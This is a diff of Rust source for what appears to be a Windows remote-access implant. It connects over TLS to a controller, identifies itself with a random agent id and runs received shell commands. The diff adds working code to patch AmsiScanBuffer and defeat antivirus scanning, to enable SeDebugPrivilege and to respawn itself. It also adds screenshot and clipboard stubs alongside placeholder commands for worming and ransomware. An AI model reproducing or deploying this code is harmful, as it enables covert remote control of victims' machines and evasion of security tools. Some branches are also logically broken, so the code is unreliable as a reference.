@@ -1,10 +1,54 @@
+#![allow(dead_code)]
+
+use rand::Rng;
+use std::iter;
+use std::{ffi::CString, ptr};
+
+use winapi::{
+    um::{
+    memoryapi::{
+        VirtualProtect,
+        WriteProcessMemory
+    },
+    libloaderapi::{
+        LoadLibraryA,
+        GetProcAddress
+    },
+    processthreadsapi::GetCurrentProcess, 
+    winnt::PAGE_READWRITE
+    }, 
+    shared::{
+        minwindef::{
+            DWORD, 
+            FALSE
+        }
+    }
+};
+//EnableDebugPrivileges
+use winapi::um::processthreadsapi::{OpenProcessToken};
+use winapi::um::winnt::{HANDLE,TOKEN_ADJUST_PRIVILEGES,TOKEN_QUERY,LUID_AND_ATTRIBUTES,SE_PRIVILEGE_ENABLED,TOKEN_PRIVILEGES};
+use std::ptr::null_mut;
+use std::mem::size_of;
+use winapi::shared::ntdef::LUID;
+use winapi::um::securitybaseapi::AdjustTokenPrivileges;
+use winapi::um::winbase::LookupPrivilegeValueA;
+//EnableDebugPrivileges
+use clipboard::ClipboardProvider;
+use clipboard::ClipboardContext;
+
 use native_tls::TlsConnector;
 use core::time;
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::path::Path;
 use std::process::Command;
+
+use win_screenshot::addon::*;
+use win_screenshot::capture::*;
 use std::{thread, env};
+
+use std::{fs, time::Instant};
+use gethostname::gethostname;
 
 fn current_dir() ->String{
     let cwd = env::current_dir().unwrap();
@@ -12,11 +56,30 @@ fn current_dir() ->String{
     return my_cwd;
 }
 
-fn mind_reader_sectioid( mindto_read:&str,Windows_shell: &str) -> Vec<u8>  {
+fn l_screenshot(){ // TODO need to implemente system also in go server
+    //https://lib.rs/crates/win-screenshot
+    let s = capture_display().unwrap();
+   
+}
+fn go_clipboard() ->String{ // TODO need to implemente system also in go server
+    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap();
+    let cwd = env::current_dir().unwrap();
+    let my_cwd = cwd.into_os_string().into_string().unwrap();
+    return my_cwd;
+}
+fn generate_string(len: usize) -> String {
+    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
+    let mut rng = rand::thread_rng();
+    let one_char = || CHARSET[rng.gen_range(0..CHARSET.len())] as char;
+    iter::repeat_with(one_char).take(len).collect()
+}
+
+
+fn mind_reader_sectioid( mindto_read:&str,windows_shell: &str) -> Vec<u8>  {
     let output = if cfg!(target_os = "windows") {
-        match Windows_shell {
+        match windows_shell {
             "cmd" => {
-                Command::new(Windows_shell)
+                Command::new(windows_shell)
                 .args(["/C ", mindto_read])
                 .output()
                 .expect("failed to execute process")
@@ -36,7 +99,7 @@ fn mind_reader_sectioid( mindto_read:&str,Windows_shell: &str) -> Vec<u8>  {
                 }
 
         };
-        Command::new(Windows_shell)
+        Command::new(windows_shell)
                 .args(["/C", mindto_read])
                 .output()
                 .expect("failed to execute process")
@@ -50,7 +113,13 @@ fn mind_reader_sectioid( mindto_read:&str,Windows_shell: &str) -> Vec<u8>  {
     
     return output.stdout;
 }
-
+//get process_name
+fn get_exec_name() -> Option<String> {
+    std::env::current_exe()
+        .ok()
+        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
+        .and_then(|s| s.into_string().ok())
+}
 
 fn main() {
    // let connector = TlsConnector::new();
@@ -65,10 +134,14 @@ fn main() {
 
     let mut muton = [0 as u8; 524288];
     let mut windows_shell="cmd";
-    tls.write_all(current_dir().as_bytes());
+    //tls.write_all(current_dir().as_bytes());
+    let mut id =(("agent " ).to_string())+&(generate_string(15).to_string());
+
+
     loop {
         tls.write_all(current_dir().as_bytes());
-        tls.write_all(current_dir().as_bytes());
+        tls.write_all((id).as_bytes());
+        
         //print on severside the working directory
 
         // read the command
@@ -85,7 +158,7 @@ fn main() {
         // this needs to be peekable so we can determine when we are on the last command
         let mut commands = raw_command.trim().split(" | ").peekable();
 
-       
+        
         while let Some(command) = commands.next() {
             // everything after the first whitespace character is interpreted as args to the command
             println!("{:?}",command);
@@ -111,10 +184,20 @@ fn main() {
                 //https://docs.rs/powershell_script/latest/powershell_script/
                 "powershell" => {
                     windows_shell="powershell"; 
-                    tls.write_all(b"Sleep Finished"); },
-                "cmd" => {windows_shell="cmd";  tls.write_all(b"Sleep Finished");},
+                    tls.write_all(b"powershell swicth Finished"); },
+                "cmd" => {windows_shell="cmd";  tls.write_all(b"cmd swicth Finished");},
                 "ClippyON" => return,
                 "ClippyOFF" => return,
+                "spawn-self" => {
+                    let program_name_exe=std::env::current_exe()
+                    .expect("Can't get the exec path")
+                    .file_name()
+                    .expect("Can't get the exec name")
+                    .to_string_lossy()
+                    .into_owned();
+                    Command::new(program_name_exe).spawn();
+                    tls.write_all(b"spawn-self Finished");
+                }
                 "CreapyON" => return,
                 "CreapyOFF" => return,
                 "Make_Self" => return,
@@ -123,7 +206,85 @@ fn main() {
                 "WormSelf" => return,
                 "RansomOnPOC" => return,
                 "Migrate" => return,
-                "EnableDebugPrivileges"=> {},
+                "Amsi_bypass_enable" =>{
+                    println!("[+] Patching amsi for current process...");
+
+                    unsafe {
+                        // Getting the address of AmsiScanBuffer.
+                        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+                        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+                        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+                        let mut old_permissions: DWORD = 0;
+                        
+                        // Overwrite this address with nops.
+                        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
+                            tls.write_all(("[-] Failed to change protection.").as_bytes());
+                        }
+                        let written: *mut usize = ptr::null_mut();
+                
+                        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
+                            tls.write_all(("[-] Failed to overwrite function.").as_bytes());
+                        }
+          
+                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());
+
+                     
+                }
+            },"Amsi_bypass_status" =>{
+                println!("[+] Patching amsi for current process...");
+
+                unsafe {
+                    // Getting the address of AmsiScanBuffer.
+                    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+                    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+                    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+                    let mut old_permissions: DWORD = 0;
+                    
+                    // Overwrite this address with nops.
+                    if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
+                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());
+                    }
+                    let written: *mut usize = ptr::null_mut();
+            
+                    if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
+                        tls.write_all(("[+] AmsiScanBuffer Enabled!").as_bytes());
+                    }     else
+                    {
+                        tls.write_all(("[+] AmsiScanBuffer Disabled!").as_bytes());
+                    }
+                    
+
+                 
+            }
+        },"Amsi_bypass_disable" =>{
+                println!("[+] Patching amsi for current process...");
+
+                unsafe {
+                    // Getting the address of AmsiScanBuffer.
+                    let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+                    let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+                    let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+                    let mut old_permissions: DWORD = 0;
+                    let written: *mut usize = ptr::null_mut();
+                 
+            
+                    // Restoring the permissions.
+                    VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
+                    tls.write_all(("[+] AmsiScanBuffer Enabled!").as_bytes());
+
+                 
+            }
+        },
+                            "EnableDebugPrivileges"=> {unsafe{
+                    let mut h_token: HANDLE = 0 as _;
+                    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&mut h_token);
+                    let privs = LUID_AND_ATTRIBUTES {Luid: LUID { LowPart: 0, HighPart: 0,},Attributes: SE_PRIVILEGE_ENABLED,};
+                    let mut tp = TOKEN_PRIVILEGES {PrivilegeCount: 1,Privileges: [privs ;1],};
+                    let privilege = "SeDebugPrivilege\0";
+                    let _ = LookupPrivilegeValueA(null_mut(),privilege.as_ptr() as *const i8,&mut tp.Privileges[0].Luid,);
+                    let _ = AdjustTokenPrivileges(h_token,0,&mut tp,size_of::<TOKEN_PRIVILEGES>() as _,null_mut(),null_mut());
+                    tls.write_all(b"SeDebugPrivilege Finished");
+              }},
                 "sleep15s" => {
                     let ten_millis = time::Duration::from_millis(15000);
                     thread::sleep(ten_millis);
